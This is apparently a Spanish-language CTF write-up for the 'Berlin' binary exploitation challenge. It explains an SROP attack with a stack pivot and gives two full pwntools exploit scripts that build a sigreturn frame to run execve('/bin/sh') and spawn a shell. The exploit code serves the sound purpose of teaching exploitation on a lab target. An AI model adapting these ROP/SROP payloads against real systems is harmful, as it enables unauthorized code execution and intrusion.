---
layout: single
classes: wide
title: "Sombrero-Q4 CTF [PWN] Berlin"
excerpt: "Aquí dejo un writeup cortito para el desafío Berlin de la categoría PWN, hecho por dplastico del CTF de SombreroBlanco, llevado a cabo el fin de semana del 25 de Julio. Tenia una puntuacion de 500 pts y, si bien el CTF tenia puntuacion dinámica, se mantuvo ahi por la baja cantidad de soluciones que tuvo."
---

Aquí dejo un writeup cortito para el desafío Berlin de la categoría PWN, hecho por [dplastico](https://dplastico.me/) del CTF de SombreroBlanco & Q4, llevado a cabo el fin de semana del 25 de Julio. Tenia una puntuacion de 500 pts y, si bien el CTF tenia puntuacion dinámica, se mantuvo ahi por la baja cantidad de soluciones que tuvo.

Pueden descargar el binario [aqui](https://c4ebt.github.io/content/sombrero2020/berlin).

Para sacar la shell de este binario usé una técnica llamada SROP. Recomiendo investigar un poco sobre ella si quieren entender lo que pasa de mejor manera :D

En un principio lo que mas me complico para resolver el desafío fue la falta de espacio para roppear y la falta de gadgets para pivotear, ya que SROP requiere de mucho espacio en el stack para introducir la SigReturn Frame, que es bastante larga. La falta de gadgets en verdad fue una falta de visión miá o algo, ya que por alguna razón pensé que no podia usar un gadget que era bastante claro.

Aquí dejo un dump de las instrucciones del binario, explicando un poco como va la gadget chain para pivotear el stack:

![](https://c4ebt.github.io/assets/images/content/sombrero2020/dump.png)

La forma intencional para resolver el desafío era mediante el simple uso de esta gadget chain, pero como dije antes, yo no la vi en un principio. Por eso pase un tiempo buscando otra forma de explotar el binario, sin necesidad de un stack pivot. Finalmente, llegue a un exploit en el que llamaba a la syscall de read nuevamente, pero esta vez apuntando a un buffer (mediante el control de `rsi`) que estaba mas arriba en el stack, lo que me permitiría sobreescribir aun mas el stack, dándome mas espacio (en este caso virtualmente ilimitado) para poder roppear y tirar mi SigReturn frame tranquilo. 

Logré sacar una shell localmente con este exploit, pero no pude hacer que funcionara de manera remota. Esto se debe a que los setups remoto y local son diferentes, por lo que las variables de ambiente están posicionadas también de manera diferente en el stack. Esto probablemente causo que en la instancia remota mi exploit sobreescribiera alguna env var importante, causando que el proceso crashee. La otra posibilidad es que, al ser diferentes los stacks, los offsets que use para mi exploit hayan sido diferentes también. Esta segunda posibilidad es fácilmente solucionable en la posesión de un debugger y de manera local, pero al estar la diferencia en la instancia remota, habría requerido fuerza bruta a algún offset, siendo la técnica  potencialmente imposible.

Aquí dejo entonces ambos exploits, el de la gadget chain simple (que funcionaba de manera remota) y el mas complejo que no funcionaba. Siendo la vulnerabilidad la misma, son considerablemente similares, variando solo en algunos puntos.


#### ret2read:
```python
#!/usr/bin/python
from pwn import *

context.log_level = 'DEBUG'
p = process("./berlin")
#p = gdb.debug("./berlin", "b *0x004000f5")
#p = remote("46.101.118.108", 12345)

stack = u64(p.recv(8))
log.info("Stack: " + hex(stack))

junk = "/bin/sh\x00".ljust(512, "A")

# Addresses
loop = p64(0x004000f5)
mov_edx_syscall = p64(0x4000d5)
xors = p64(0x4000dd)
mov_rsi_rsp = p64(0x400108)
syscall = p64(0x4000da)
write = p64(0x4000f2)


payload = (junk
        + mov_rsi_rsp		# Setear rsi a una direccion del stack
        + xors			# Resetear otros registros para la syscall de read
        + mov_edx_syscall	# read syscall a un buffer en el stack para tener mas espacio
        )

p.sendline(payload)

context.arch = 'amd64'
frame = SigreturnFrame()

frame.rip = 0x4000da # syscall
frame.rax = 0x3b     # execve
frame.rdi = stack - 520        # binsh
frame.rdx = 0	     # NULL argv
frame.rsi = 0	     # NULL envp
frame.rsp = stack    # No es necesario

payload = (p64(0x00)*2	# Offset
        + xors		# Resetear registros
        + p64(0x4000ec)	# mini-read (me sirvio para evitar algunos errores, es posible no usarlo)
        + syscall	# mini-read
        + loop*14	# Loop para llegar a rax=15
        + syscall	# SigReturn
        + str(frame)	# SigReturn Frame
        )

payload = payload.ljust(0x228, "Y")

p.sendline(payload)

p.interactive()
```

#### Gadget chain stack pivot:
```python
#!/usr/bin/python
from pwn import *

context.log_level = 'DEBUG'
#p = process("./berlin")
#p = gdb.debug("./berlin", "b *0x004000f5")
p = remote("46.101.118.108", 12345)

stack = u64(p.recv(8)) # Stack leak que nos da el binario
log.info("Stack: " + hex(stack))


# Addresses
loop = p64(0x004000f5)  	# Address del gadget que nos permite incrementar rax para
				# llegar a la syscall 15 (SigReturn)
mov_edx_syscall = p64(0x4000d5)
xors = p64(0x4000dd)
mov_rsi_rsp = p64(0x400108) # mov    rsi,rsp; ret;
syscall = p64(0x4000da)

context.arch = 'amd64'
frame = SigreturnFrame()

frame.rip = 0x4000da # syscall
frame.rax = 0x3b     # execve
frame.rdi = stack - 520        # filename: "/bin/sh\x00"
frame.rdx = 0	     # NULL argv
frame.rsi = 0	     # NULL envp
frame.rsp = stack    # No es necesario


payload2 = ("/bin/sh\x00" # String para la call a execve
        + xors		  # Resetear registros
        + loop*15	  # Loop para llegar a rax=15
        + syscall	  # SigReturn
        + str(frame)	  # SigReturn Frame
        )

payload2 = payload2.ljust(512, "Y")
payload1 = (payload2
        + mov_rsi_rsp	# Poner una direccion del stack en rsi
        + p64(0x40011c) # xor r15, rsi; ret
        + p64(0x40010c) # sub    r15,0x200; mov    rsp,r15; ret;
        )


p.sendline(payload1)
p.interactive()
```

Gracias a los organizadores del CTF, estuvo muy divertido :D
Cualquier duda están mis redes sociales adjuntadas en la pagina web para que puedan ponerse en contacto.

Keep pwning!
